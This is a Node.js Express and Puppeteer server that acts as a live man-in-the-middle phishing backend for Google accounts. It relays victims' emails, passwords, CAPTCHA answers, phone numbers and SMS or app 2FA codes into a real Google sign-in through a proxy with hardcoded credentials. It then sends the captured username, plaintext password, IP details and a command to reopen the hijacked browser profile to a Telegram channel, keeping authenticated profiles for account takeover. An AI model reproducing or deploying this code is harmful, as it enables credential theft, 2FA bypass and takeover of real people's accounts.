const express = require("express");
const puppeteer = require("puppeteer");
const path = require("path");
const fs = require("fs");
const fsExtra = require("fs-extra");
const { v4: uuidv4 } = require("uuid");
const axios = require("axios");

const { sendTelegramMessage } = require("./utils/telegram");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname)));

const getChromePath = () =>
  ({
    win32: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    linux: "/usr/bin/google-chrome",
    darwin: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
  }[process.platform]);

// Sessions map
const sessions = {};
const INACTIVITY_TIMEOUT = 5 * 60 * 1000;

function resetInactivityTimer(sessionId) {
  const session = sessions[sessionId];
  if (!session) return;

  if (session.timeout) clearTimeout(session.timeout);

  session.timeout = setTimeout(async () => {
    console.log(`Session ${sessionId} inactive. Closing browser.`);
    if (session.browser) await session.browser.close();

    if (session.profilePath) await fsExtra.remove(session.profilePath);
    delete sessions[sessionId];
  }, INACTIVITY_TIMEOUT);
}

async function waitForSpinnerToFinish(page, timeout = 8000) {
  // Wait for spinner to appear (loading in progress)
  try {
    await page.waitForSelector('div[jsname="P1ekSe"][aria-hidden="false"]', {
      timeout,
    });
  } catch {}

  // Wait for spinner to disappear (loading finished)
  try {
    await page.waitForFunction(
      () => {
        const el = document.querySelector('div[jsname="P1ekSe"]');
        return el && el.getAttribute("aria-hidden") === "true";
      },
      { timeout }
    );
  } catch {}
}

const PROXY = {
  host: "gw.dataimpulse.com",
  port: 823,
  username: "e34f312113450eeb8578__cr.it",
  password: "517aa00c2c9ed320",
};

app.post("/start-session", async (req, res) => {
  try {
    const sessionId = uuidv4();
    const profilePath = path.join(__dirname, "chrome-profiles", sessionId);
    if (!fs.existsSync(profilePath))
      fs.mkdirSync(profilePath, { recursive: true });

    // Get IP information from client (browser)
    const ipInfo = req.body.clientIpInfo || null;
    console.log(`Session ${sessionId}: Client IP Info received:`, ipInfo);

    // Return session ID immediately
    res.json({ success: true, sessionId, profilePath });

    // Launch Puppeteer in background
    (async () => {
      const browser = await puppeteer.launch({
        headless: false,
        executablePath: getChromePath(),
        userDataDir: profilePath,
        defaultViewport: null,
        args: [
          `--proxy-server=http://${PROXY.host}:${PROXY.port}`,
          "--start-maximized",
          "--no-sandbox",
          "--disable-setuid-sandbox",
          "--disable-blink-features=AutomationControlled",
        ],
      });

      const page = await browser.newPage();

      await page.authenticate({
        username: PROXY.username,
        password: PROXY.password,
      });

      await page.setUserAgent(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
          "Chrome/128.0.0.0 Safari/537.36"
      );
      await page.setExtraHTTPHeaders({ "Accept-Language": "en-US,en;q=0.9" });

      await page.goto("https://accounts.google.com", {
        waitUntil: "domcontentloaded",
      });

      sessions[sessionId] = {
        browser,
        page,
        profilePath,
        ipInfo,
        userInfo: {},
      };
      resetInactivityTimer(sessionId);
      console.log(`Session started: ${sessionId}`);
    })();
  } catch (err) {
    console.error("Start session error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/sign-in", async (req, res) => {
  try {
    const { sessionId, username } = req.body;
    const session = sessions[sessionId];
    if (!session)
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });

    resetInactivityTimer(sessionId);
    const { page } = session;

    session.userInfo = {
      email: username,
      userAgent: await page.evaluate(() => navigator.userAgent),
    };

    await page.waitForSelector('input[name="identifier"]', {
      visible: true,
      timeout: 60000,
    });
    await page.evaluate(() => {
      const input = document.querySelector('input[name="identifier"]');
      if (input) input.value = "";
    });
    await page.click('input[name="identifier"]', { clickCount: 3 });
    await page.type('input[name="identifier"]', username, { delay: 30 });
    await page.keyboard.press("Enter");

    const invalidEmail = "Couldn’t find your Google Account";
    const validEmail = "Enter your password";
    const captchaCommand = "Type the text you hear or see";

    const detectedText = await page.waitForFunction(
      (invalidEmail, validEmail, captchaCommand) => {
        const bodyText = document.body.innerText;
        if (bodyText.includes(invalidEmail)) return invalidEmail;
        if (bodyText.includes(validEmail)) return validEmail;
        if (bodyText.includes(captchaCommand)) return captchaCommand;
        return null;
      },
      { timeout: 20000, polling: 100 },
      invalidEmail,
      validEmail,
      captchaCommand
    );

    const result = await detectedText.jsonValue();

    if (result === invalidEmail) {
      console.log(`Session ${sessionId}: ❌ Couldn’t find your Google account`);
      return res.json(0);
    }

    if (result === validEmail) {
      console.log(`Session ${sessionId}: 🔢 Enter your password`);
      return res.json(1);
    }

    if (result === captchaCommand) {
      console.log(`Session ${sessionId}: 🔢 CAPTCHA detected`);

      // Wait for captcha image
      const captchaImg = await page.waitForSelector("#captchaimg", {
        visible: true,
        timeout: 10000,
      });

      // Extract image source
      const captchaSrc = await page.evaluate((img) => img.src, captchaImg);
      const fullCaptchaUrl = captchaSrc.startsWith("http")
        ? captchaSrc
        : new URL(captchaSrc, page.url()).href;

      // Ensure folder exists
      const captchaDir = path.join(__dirname, "captchas");
      if (!fs.existsSync(captchaDir))
        fs.mkdirSync(captchaDir, { recursive: true });

      // Define output file path
      const captchaPath = path.join(captchaDir, `${sessionId}.png`);

      // Download and save the image
      const response = await axios.get(fullCaptchaUrl, {
        responseType: "arraybuffer",
      });
      fs.writeFileSync(captchaPath, response.data);
      // console.log(`✅ CAPTCHA saved: ${captchaPath}`);

      return res.json(2);
    }
  } catch (err) {
    console.error("Sign-in error:", err);
  }
});

app.post("/sign-in-captcha", async (req, res) => {
  try {
    const { sessionId, captcha } = req.body;
    const session = sessions[sessionId];
    if (!session)
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });

    resetInactivityTimer(sessionId);
    const { page } = session;

    session.userInfo = {
      ...session.userInfo,
      captcha,
      userAgent: await page.evaluate(() => navigator.userAgent),
    };

    // Wait for CAPTCHA input
    await page.waitForSelector('input[name="ca"]', {
      visible: true,
      timeout: 10000,
    });

    // Clear old input and type new value
    await page.evaluate(() => {
      const input = document.querySelector('input[name="ca"]');
      if (input) input.value = "";
    });

    await page.click('input[name="ca"]', { clickCount: 3 });
    await page.type('input[name="ca"]', captcha, { delay: 30 });
    await page.keyboard.press("Enter");

    const validCaptcha = "Enter your password";

    // Wait for either success or CAPTCHA field reappearance
    const result = await Promise.race([
      page
        .waitForFunction(
          (text) => document.body.innerText.includes(text),
          { polling: 200, timeout: 10000 },
          validCaptcha
        )
        .then(() => "valid"),
      page
        .waitForSelector('input[name="ca"]', { visible: true, timeout: 8000 })
        .then(() => "maybeInvalid"),
    ]);

    if (result === "valid") {
      console.log(`Session ${sessionId}: ✅ CAPTCHA solved successfully`);
      return res.json(1);
    }

    // 👇 Double-check in case the valid text appears slightly later
    try {
      await page.waitForFunction(
        (text) => document.body.innerText.includes(text),
        { polling: 200, timeout: 3000 },
        validCaptcha
      );
      console.log(
        `Session ${sessionId}: ✅ CAPTCHA solved successfully (late detect)`
      );
      return res.json(1);
    } catch {
      // Proceed as invalid only if truly no success
    }

    // ❌ Invalid CAPTCHA confirmed
    console.log(
      `Session ${sessionId}: ❌ Invalid CAPTCHA entered — refreshing image...`
    );
    await new Promise((resolve) => setTimeout(resolve, 2000));

    try {
      const captchaImg = await page.waitForSelector("#captchaimg", {
        visible: true,
        timeout: 5000,
      });
      const captchaSrc = await page.evaluate((img) => img.src, captchaImg);
      const fullCaptchaUrl = captchaSrc.startsWith("http")
        ? captchaSrc
        : new URL(captchaSrc, page.url()).href;

      const captchaDir = path.join(__dirname, "captchas");
      if (!fs.existsSync(captchaDir))
        fs.mkdirSync(captchaDir, { recursive: true });

      const captchaPath = path.join(captchaDir, `${sessionId}.png`);
      const response = await axios.get(fullCaptchaUrl, {
        responseType: "arraybuffer",
      });
      fs.writeFileSync(captchaPath, response.data);

      console.log(`🔁 CAPTCHA updated after 2s delay: ${captchaPath}`);
      return res.json(0); // tell client to retry
    } catch {
      // CAPTCHA image not found — might mean we actually passed
      console.log(
        `Session ${sessionId}: ⚠️ CAPTCHA image not found (likely passed stage).`
      );
      return res.json(1);
    }
  } catch (err) {
    console.error("Sign-in-captcha error:", err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/sign-in-2", async (req, res) => {
  try {
    const { sessionId, password } = req.body;
    const session = sessions[sessionId];
    if (!session)
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });

    resetInactivityTimer(sessionId);

    const { page } = session;

    session.userInfo = {
      ...session.userInfo,
      password: password,
      userAgent: await page.evaluate(() => navigator.userAgent),
    };

    await page.waitForSelector('input[name="Passwd"]', {
      visible: true,
      timeout: 10000,
    });

    await page.evaluate(() => {
      const input = document.querySelector('input[name="Passwd"]');
      if (input) input.value = "";
    });

    await page.click('input[name="Passwd"]', { clickCount: 3 });
    await page.type('input[name="Passwd"]', password, { delay: 30 });
    await page.keyboard.press("Enter");

    const invalidPassword = "Wrong password.";
    const oldPassword = "Your password was changed"
    const validPassword = "Check your";
    const OpenThe = "Open the";
    const smsChallengeText = "Choose how you want to sign in:";
    const smsChallengeText2 =
      "Enter a phone number to get a text message with a verification code.";
    const welcome = "Welcome,";
    const signInFaster = "Sign in faster";
    const successUrlSubstring = "myaccount.google.com";
    const successUrlSubstring2 = "gds.google.com";

    // We may still be on the password screen for a bit after pressing Enter.
    // Poll a few times before deciding it's an unexpected state.
    const maxChecks = 6; // e.g. ~12 seconds total with 2s delay
    let lastUrl = null;
    let lastBodyText = "";
    let lastConditionFlags = null;

    for (let attempt = 1; attempt <= maxChecks; attempt++) {
      // ⏳ Wait for Google validation spinner on each attempt
      await waitForSpinnerToFinish(page, 10000);

      const currentUrl = page.url();
      lastUrl = currentUrl;
      console.log(
        `Session ${sessionId}: 🌐 [Attempt ${attempt}/${maxChecks}] URL after password submit → ${currentUrl}`
      );

      if (
        currentUrl.includes(successUrlSubstring) ||
        currentUrl.includes(successUrlSubstring2)
      ) {
        console.log(`Session ${sessionId}: ✅ login success (URL check)`);
        await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
        return res.json({ success: true, code: 3, message: "Verified" });
      }

      console.log(
        `Session ${sessionId}: ℹ️ [Attempt ${attempt}/${maxChecks}] URL did not match success patterns, inspecting body text...`
      );

      let bodyText = await page.evaluate(() => document.body.innerText);
      lastBodyText = bodyText;

      // Log body text diagnostics (length + preview only, to avoid massive logs)
      console.log(
        `Session ${sessionId}: 🔍 [Attempt ${attempt}/${maxChecks}] Body text length: ${
          bodyText?.length ?? 0
        }`
      );
      console.log(
        `Session ${sessionId}: 🔍 [Attempt ${attempt}/${maxChecks}] Body text preview (first 1000 chars):\n${bodyText.slice(
          0,
          1000
        )}`
      );

      // Precompute all condition flags for detailed debugging
      const conditionFlags = {
        invalidPassword: bodyText.includes(invalidPassword),
        oldPassword: bodyText.includes(oldPassword),
        validPassword: bodyText.includes(validPassword),
        openThe: bodyText.includes(OpenThe),
        smsChallenge: bodyText.includes(smsChallengeText),
        smsChallenge2: bodyText.includes(smsChallengeText2),
        signInFaster: bodyText.includes(signInFaster),
        welcome: bodyText.includes(welcome),
      };
      lastConditionFlags = conditionFlags;

      console.log(
        `Session ${sessionId}: ✅ [Attempt ${attempt}/${maxChecks}] Condition flags after password submit:`,
        conditionFlags
      );

      if (conditionFlags.invalidPassword || conditionFlags.oldPassword) {
        console.log(`Session ${sessionId}: ❌ Wrong password`);
        return res.json({ success: false, code: 0 });
      }

      if (conditionFlags.validPassword) {
        const match = bodyText.match(/Check your\s+([^\n]+)/i);
        const checkTarget = match ? match[1].trim() : null;

        const extractedNumber = await page.evaluate(() => {
          const el = document.querySelector('samp.Sevzkc[jsname="feLNVc"]');
          if (!el) return null;
          const text = el.innerText.trim();
          return /^\d+$/.test(text) ? text : null;
        });

        return res.json({
          success: true,
          code: extractedNumber || 1,
          message: checkTarget || "",
        });
      }

      if (conditionFlags.openThe) {
        const match = bodyText.match(/Open the\s+([^\n]+)/i);
        const checkTarget = match ? match[1].trim() : null;

        const extractedNumber = await page.evaluate(() => {
          const el = document.querySelector('samp.Sevzkc[jsname="feLNVc"]');
          if (!el) return null;
          const text = el.innerText.trim();
          return /^\d+$/.test(text) ? text : null;
        });

        return res.json({
          success: true,
          code: extractedNumber || 1,
          message: checkTarget || "",
        });
      }

      if (conditionFlags.smsChallenge) {
        await page.evaluate(() => {
          const btn =
            document.querySelector('[data-challengevariant="SMS"]') ||
            [...document.querySelectorAll("button, div")].find(
              (el) =>
                el.innerText &&
                (el.innerText.includes("Text") ||
                  el.innerText.includes("SMS"))
            );
          if (btn) btn.click();
        });

        const maskedPhone = await page.evaluate(() => {
          const selectors = [
            "div.dMNVAe span[jsname='wKtwcc']",
            "span.red0Me span[jsname='wKtwcc']",
            "span[jsname='wKtwcc']",
            "span[data-phone-number]",
          ];
          for (const s of selectors) {
            const el = document.querySelector(s);
            if (el && el.innerText.includes("•")) return el.innerText.trim();
          }
          return null;
        });

        return res.json({ success: true, code: 2, message: maskedPhone });
      }

      if (conditionFlags.smsChallenge2) {
        const maskedPhone = await page.evaluate(() => {
          const selectors = [
            "div.dMNVAe span[jsname='wKtwcc']",
            "span.red0Me span[jsname='wKtwcc']",
            "span[jsname='wKtwcc']",
            "span[data-phone-number]",
          ];
          for (const s of selectors) {
            const el = document.querySelector(s);
            if (el && el.innerText.includes("•")) return el.innerText.trim();
          }
          return null;
        });

        return res.json({ success: true, code: 2, message: maskedPhone });
      }

      if (conditionFlags.signInFaster) {
        console.log(`Session ${sessionId}: 🚀 Sign in faster`);
        await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
        return res.json({ success: true, code: 3, message: signInFaster });
      }

      if (conditionFlags.welcome) {
        console.log(`Session ${sessionId}: ✅ Welcome screen`);
        await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
        return res.json({ success: true, code: 3, message: welcome });
      }

      const stillOnPasswordScreen =
        /Enter your password/i.test(bodyText) &&
        !conditionFlags.invalidPassword &&
        !conditionFlags.validPassword;

      if (stillOnPasswordScreen && attempt < maxChecks) {
        console.log(
          `Session ${sessionId}: ⏳ Still on password screen, waiting before next check...`
        );
        await new Promise((resolve) => setTimeout(resolve, 2000));
        continue;
      }

      if (attempt < maxChecks) {
        console.log(
          `Session ${sessionId}: ⚠️ Unknown state, retrying check in 2s...`
        );
        await new Promise((resolve) => setTimeout(resolve, 2000));
        continue;
      }
    }

    console.log(
      `Session ${sessionId}: ⚠️ Reached unexpected state after password (after ${maxChecks} checks).\n` +
        `URL: ${lastUrl}\n` +
        `Condition flags: ${JSON.stringify(lastConditionFlags)}\n` +
        `Body length: ${lastBodyText?.length ?? 0}\n` +
        `Body preview (first 1000 chars):\n${lastBodyText.slice(0, 1000)}`
    );

    return res.json({ success: false, code: 20, message: "Unexpected state" });
  } catch (err) {
    console.error("Sign-in-2 error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/verify-google-url", async (req, res) => {
  try {
    const { sessionId } = req.body;
    const session = sessions[sessionId];

    // Check session validity
    if (!session)
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });

    resetInactivityTimer(sessionId);

    const { page } = session;

    // Get current page URL
    const currentUrl = page.url();
    // console.log(`Session ${sessionId}: 🌐 Current URL → ${currentUrl}`);

    // Check if the URL is Google's account domain
    if (
      currentUrl.includes(
        "myaccount.google.com" || currentUrl.includes("gds.google.com")
      )
    ) {
      console.log(`Session ${sessionId}: ✅ 2FA Successful`);
      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
      return res.json(1);
    } else {
      // console.log(`Session ${sessionId}: ❌ Not on Google account page`);
      return res.json(0);
    }
  } catch (err) {
    console.error("verify-google-url error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/confirm-phone", async (req, res) => {
  try {
    const { sessionId, phone } = req.body;
    const session = sessions[sessionId];

    if (!session)
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });

    resetInactivityTimer(sessionId);

    const { page } = session;

    // Wait for phone input
    await page.waitForSelector("#phoneNumberId", {
      visible: true,
      timeout: 8000,
    });

    // Clear and type the phone number fresh each time
    await page.evaluate(() => {
      const input = document.querySelector("#phoneNumberId");
      if (input) input.value = "";
    });

    await page.click("#phoneNumberId", { clickCount: 3 });
    await page.type("#phoneNumberId", phone, { delay: 35 });
    await page.keyboard.press("Enter");

    // ⏳ Wait for Google UI update to finish
    await waitForSpinnerToFinish(page);

    // ✅ Check if wrong number message appeared
    const wrongNumberFound = await page.evaluate(() => {
      return document.body.innerText.includes(
        "This number doesn’t match the one you provided. Try again."
      );
    });

    if (wrongNumberFound) {
      console.log(`Session ${sessionId}: ❌ Wrong phone number`);
      return res.json({
        success: false,
        code: 0,
        message: "Phone number does not match",
      });
    }

    // ✅ Check if SMS was sent
    const smsSentFound = await page.evaluate(() => {
      return [...document.querySelectorAll("div.dMNVAe")].some((el) =>
        el.innerText.includes("verification code")
      );
    });

    if (smsSentFound) {
      const maskedNumber = await page.evaluate(() => {
        const el = document.querySelector('div.dMNVAe span[jsname="wKtwcc"]');
        return el ? el.innerText.trim() : null;
      });

      console.log(
        `Session ${sessionId}: 📱 SMS sent successfully to ${
          maskedNumber || phone
        }`
      );

      return res.json({
        success: true,
        code: 1,
        phone: maskedNumber || phone,
        message: "SMS sent successfully",
      });
    }

    // If neither condition appeared:
    console.log(`Session ${sessionId}: ⚠️ No clear result — waiting again...`);
    return res.json({
      success: false,
      code: 2,
      message: "Unable to determine state",
    });
  } catch (err) {
    console.error("confirm-phone error:", err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/phone-otp", async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    const session = sessions[sessionId];

    if (!session)
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });

    resetInactivityTimer(sessionId);

    const { page } = session;

    // Failure and success indicators
    const wrongCodeText = "Wrong code. Try again.";
    const successUrlSubstring = "myaccount.google.com";
    const successUrlSubstring2 = "gds.google.com";

    // Wait for OTP input
    await page.waitForSelector('input[type="tel"]', {
      visible: true,
      timeout: 8000,
    });

    // Clear input before typing
    await page.evaluate(() => {
      const input = document.querySelector('input[type="tel"]');
      if (input) input.value = "";
    });

    await page.type('input[type="tel"]', code, { delay: 30 });
    await page.keyboard.press("Enter");

    // ✅ Wait for Google validation spinner to finish
    await waitForSpinnerToFinish(page, 10000);

    // Check URL first
    const currentUrl = page.url();
    if (
      currentUrl.includes(successUrlSubstring) ||
      currentUrl.includes(successUrlSubstring2)
    ) {
      console.log(`Session ${sessionId}: ✅ OTP accepted — login success`);
      await sendLoginSessionMessage(sessionId); // ✅ Send Telegram
      return res.json({ success: true, code: 1, message: "Verified" });
    }

    // Check page text fallback
    let bodyText = await page.evaluate(() => document.body.innerText);

    // ❌ Wrong OTP
    if (bodyText.includes(wrongCodeText)) {
      console.log(`Session ${sessionId}: ❌ Wrong OTP`);
      return res.json({ success: false, code: 0, message: wrongCodeText });
    }

    // ✅ Success detected via text like "Welcome"
    if (bodyText.match(/Welcome|Account|You're signed in/i)) {
      console.log(
        `Session ${sessionId}: ✅ OTP accepted (welcome text detected)`
      );
      return res.json({ success: true, code: 1, message: "Verified" });
    }

    // Fallback
    console.log(`Session ${sessionId}: ⚠️ No clear result`);
    return res.json({
      success: false,
      code: 2,
      message: "Unknown state — try again or re-check UI",
    });
  } catch (err) {
    console.error("phone-otp error:", err);
    return res.status(500).json({ success: false, error: err.message });
  }
});

async function sendLoginSessionMessage(sessionId) {
  try {
    const session = sessions[sessionId];
    if (!session) return;

    // avoid duplicate sends
    if (session._telegramSent) {
      console.log(`Session ${sessionId}: Telegram already sent — skipping.`);
      return;
    }

    const { userInfo, ipInfo, page, browser, profilePath } = session;

    let currentUrl = "unknown";
    try {
      currentUrl = page.url() || currentUrl;
    } catch {}

    const ipDetails = ipInfo && ipInfo.ip && ipInfo.ip !== "unknown"
      ? `IP: ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}`
      : `IP: unknown`;

    const profileCmd = `"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --user-data-dir="C:\\Users\\Administrator\\Desktop\\gmail\\chrome-profiles\\${sessionId}"`;

    const sessionMessage =
      `<b>New Session Captured</b>\n\n` +
      `Name : GOOGLE\n` +
      `Username : ${userInfo?.email || "unknown"}\n` +
      `Password : <tg-spoiler>${userInfo?.password || ""}</tg-spoiler>\n` +
      `Landing URL : ${currentUrl}\n` +
      `${ipDetails}\n\n` +
      `👆 <b>Profile (open with):</b>\n` +
      `<code>${profileCmd}</code>`;

    // ✅ Send Telegram Message
    await sendTelegramMessage(sessionMessage);
    session._telegramSent = true;
    console.log(`Session ${sessionId}: ✅ Telegram sent successfully.`);

    // ✅ Only close browser — DO NOT DELETE ANYTHING
    if (browser) {
      console.log(`Session ${sessionId}: 🛑 Closing browser...`);
      await browser.close();
    }

    // 🚫 DO NOT DELETE PROFILE
    // 🚫 DO NOT REMOVE SESSION
    // We leave profilePath and sessions[sessionId] untouched.

    console.log(
      `Session ${sessionId}: ✅ Browser closed. Profile & session preserved.`
    );
  } catch (err) {
    console.error("sendLoginSessionMessage error:", err);
  }
}

app.post("/end-session", async (req, res) => {
  try {
    const { sessionId } = req.body;
    const session = sessions[sessionId];
    if (session) {
      if (session.timeout) clearTimeout(session.timeout);
      if (session.browser) await session.browser.close();
      if (session.profilePath) await fsExtra.remove(session.profilePath);
      delete sessions[sessionId];
      return res.json({
        success: true,
        message: "Session closed and profile deleted",
      });
    }
    res.status(404).json({ success: false, error: "Session not found" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.listen(3000, () => console.log("Server running at http://localhost:3000"));
